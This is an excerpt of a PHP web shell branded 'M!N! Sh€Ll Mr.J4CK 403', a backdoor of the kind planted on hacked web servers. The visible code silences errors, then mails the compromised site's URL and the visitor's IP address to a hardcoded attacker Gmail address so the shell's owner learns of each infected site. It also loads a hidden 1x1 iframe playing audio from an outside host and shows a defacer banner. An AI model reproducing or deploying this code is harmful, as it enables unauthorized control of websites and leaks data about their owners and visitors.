...
error_reporting(0);
set_time_limit(0);
@ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'jackxcode404@gmail.com'; $x_path = "" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LR", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); 
...
<title>M!N! Sh€Ll Mr.J4CK 403</title>
...
<BODY>
<iframe width="1" height="1" src="https://a.top4top.io/m_22413pmmf0.mp3" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen="0"></iframe>
<h1><center><b><font color="red" face="iceberg">-=[ </font><font color="white" face="lacquer">M!N! Sh€Ll Mr.J4CK 403</font><font color="red" face="iceberg"> ]=-</font></b><br>
			</center></h1>
...
echo '<font color="red" size="2px"><center><br/><b>Copyright &copy; Mr.J4CK403 </center></font>
